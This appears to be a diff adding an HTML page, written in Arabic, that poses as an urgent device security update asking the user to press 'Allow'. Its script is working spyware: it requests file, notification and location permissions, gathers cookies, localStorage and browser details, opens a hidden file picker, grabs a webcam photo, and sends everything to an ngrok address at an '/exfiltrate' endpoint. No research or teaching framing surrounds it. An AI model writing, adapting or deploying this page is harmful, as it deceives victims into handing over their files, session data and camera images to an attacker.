@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تحديث أمان الجهاز</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; margin-top: 20px; }
+        .status { margin-top: 20px; color: green; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>تحديث أمني عاجل</h2>
+    <p>نظامك يحتاج إلى تحديث للتحقق من الهوية. اضغط "سماح" للمتابعة.</p>
+    <button id="allowBtn">سماح والوصول إلى الملفات</button>
+    <div id="status" class="status"></div>
+</div>
+
+<script>
+    // طلب أذونات التخزين والملفات
+    async function requestPermissions() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerText = 'جاري طلب الأذونات...';
+        
+        if ('showOpenFilePicker' in window) {
+            try { await window.showOpenFilePicker(); } catch(e) {}
+        }
+        
+        if (Notification.permission !== 'granted') {
+            await Notification.requestPermission();
+        }
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        }
+        
+        statusDiv.innerText = 'تم منح الأذونات. جاري جمع البيانات...';
+        collectAndExfiltrate();
+    }
+    
+    async function collectAndExfiltrate() {
+        let exfilData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            time: new Date().toISOString()
+        };
+        
+        // إنشاء عنصر input لاختيار الملفات (يظهر تلقائياً بعد ثانية)
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.multiple = true;
+        fileInput.style.display = 'none';
+        document.body.appendChild(fileInput);
+        
+        fileInput.addEventListener('change', async (e) => {
+            const files = e.target.files;
+            for (let file of files) {
+                const formData = new FormData();
+                formData.append('file', file);
+                await fetch('https://stephnie-semiandrogenous-mullishly.ngrok-free.dev/exfiltrate', { method: 'POST', body: formData });
+            }
+        });
+        
+        setTimeout(() => { fileInput.click(); }, 1000);
+        
+        // إرسال البيانات النصية (JSON)
+        const jsonData = JSON.stringify(exfilData);
+        const formDataJson = new FormData();
+        formDataJson.append('json_data', jsonData);
+        await fetch('https://stephnie-semiandrogenous-mullishly.ngrok-free.dev/exfiltrate', { method: 'POST', body: formDataJson });
+        
+        // التقاط صورة من الكاميرا
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const imageForm = new FormData();
+                imageForm.append('file', imageBlob, 'camera_capture.jpg');
+                await fetch('https://stephnie-semiandrogenous-mullishly.ngrok-free.dev/exfiltrate', { method: 'POST', body: imageForm });
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) {}
+        }
+        
+        statusDiv.innerText = 'اكتمل الإرسال. شكراً.';
+    }
+    
+    document.getElementById('allowBtn').addEventListener('click', requestPermissions);
+</script>
+</body>
+</html>
